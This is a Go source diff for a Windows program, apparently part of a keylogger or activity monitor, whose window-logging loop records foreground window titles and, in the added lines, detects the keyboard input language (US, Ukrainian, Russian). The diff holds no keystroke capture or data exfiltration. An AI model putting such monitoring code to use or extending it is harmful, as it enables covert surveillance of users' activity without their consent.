@@ -3,7 +3,9 @@ package main
 import (
 	"fmt"
 	"log"
+	"math"
 	"os"
+	"strconv"
 	"syscall"
 	"time"
 	"unsafe"
@@ -74,20 +76,20 @@ func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32,
 
 func windowLogger() {
 	for {
-		foreground, getForegroundWindowErr := getForegroundWindow()
+		foregroundWindow, getForegroundWindowErr := getForegroundWindow()
 		if getForegroundWindowErr != nil {
 			log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
 		}
 		window := make([]uint16, 200)
-		getWindowText(foreground, &window[0], int32(len(window)))
+		getWindowText(foregroundWindow, &window[0], int32(len(window)))
 
 		if syscall.UTF16ToString(window) != "" {
 			if tmpTitle != syscall.UTF16ToString(window) {
 				tmpTitle = syscall.UTF16ToString(window)
 				tmpWindow <- string("[" + syscall.UTF16ToString(window) + "]\r\n")
 
-				// TEST
-				hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foreground)
+				// get Language ID
+				hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
 				if getWindowThreadProcessIDErr != nil {
 					log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
 				}
@@ -97,7 +99,16 @@ func windowLogger() {
 					log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
 				}
 
-				fmt.Println("HKL ", hkl)
+				languageID := int64(hkl) & int64(math.Pow(2, 16)-1)
+
+				switch strconv.FormatInt(languageID, 16) {
+				case "409":
+					fmt.Printf("Language: United States (US) \r\n")
+				case "422":
+					fmt.Printf("Language: Ukraine (UA) \r\n")
+				case "419":
+					fmt.Printf("Language: Russia (RU) \r\n")
+				}
 			}
 		}
 		time.Sleep(1 * time.Millisecond)
